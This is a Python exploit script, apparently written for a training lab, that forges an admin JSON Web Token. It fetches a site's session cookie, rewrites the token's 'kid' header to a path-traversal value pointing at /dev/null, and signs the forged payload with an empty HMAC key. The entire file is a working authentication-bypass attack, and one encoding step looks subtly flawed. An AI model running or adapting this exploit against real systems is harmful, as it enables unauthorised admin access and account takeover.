import hmac
import base64
import hashlib
import json
import requests as req
from colorama import Fore
import sys
import argparse as argp
from argparse_color_formatter import ColorHelpFormatter


MAG = Fore.MAGENTA
RRED = Fore.LIGHTRED_EX
CYYAN = Fore.LIGHTCYAN_EX
RESETT = Fore.RESET

        
parser = argp.ArgumentParser(
    description=__doc__,
    prog="jpath.py",
    formatter_class=ColorHelpFormatter,
    epilog='''
    This script was made for Moises Tapia
    ''')

parser.add_argument("-u", "--url",   dest="urlget",
                    help="""
                    -u <url> or --url <url>
                    example: -u http://<url>/
                    """)


jwtpath = parser.parse_args()
geturl = jwtpath.urlget


def print_help():
    """Print the first Main is the srcrip do not recive some argument"""
    print(
    """
    basic commands: python3 jpath.py [-h] [-u or --url]
    """)


if len(sys.argv) < 2:
    print_help()
    sys.exit(1)

#'http://ptl-b0463287-13ca6bf2.libcurl.so/'

url = geturl

s = req.Session()

# Get the Cokkie
response = s.get(url)
headers_info = s.cookies.get_dict()

exploit = '"kid":"../../../../../../../../../../dev/null"}' # you can change this path 
exploit_user = {"user":"admin"}
search = '"kid":"0001"}'
key = ''

headers_components = ['header', 'payload', 'signature']
space = headers_info['auth'].split('.')

print("\n" + "\t" + "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀" * 2)
print("\t\t" + "Exploit JWT by moises tapia")
print("\t" + "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀" * 2 + "\n")

for clave, valor in headers_info.items():
    print("Your Cookie is: " + CYYAN + valor + RESETT)


#for head, resp in zip(headers_components, space):
#    print ('{0}: {1}.'.format(head, resp))

print("\n" + "Get the each components of Cookie: " + "\n")
print(headers_components[0] + ': ' + RRED + str(space[0]) + RESETT)
print(headers_components[1] + ': ' + MAG + str(space[1]) + RESETT)
print(headers_components[2] + ': ' + CYYAN + str(space[2]) + RESETT)

print("\n" + "Decode Header and payload...."+ "\n")

base64_header = str(space[0] + '==')
base64_payload = str(space[1] + '==')

base64_bytes = base64_header.encode('ascii')
message_bytes = base64.b64decode(base64_bytes)

base64_bytes2 = base64_payload.encode('ascii')
message_bytes2 = base64.b64decode(base64_bytes2)

header_decode = message_bytes.decode('ascii')
payload_decode = message_bytes2.decode('ascii')

print("HEADER: " + RRED + header_decode + RESETT)
print("PAYLOAD: " + MAG + payload_decode + RESETT)

print("\n" + "Ecode the new payload...."+ "\n")

new_hederjwt = header_decode.replace(search, exploit)
urlstr = base64.urlsafe_b64encode(bytes(json.dumps(new_hederjwt),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(exploit_user),encoding='utf8')).decode('utf8').rstrip("=")
sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),urlstr.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")

print(urlstr+"."+sig)
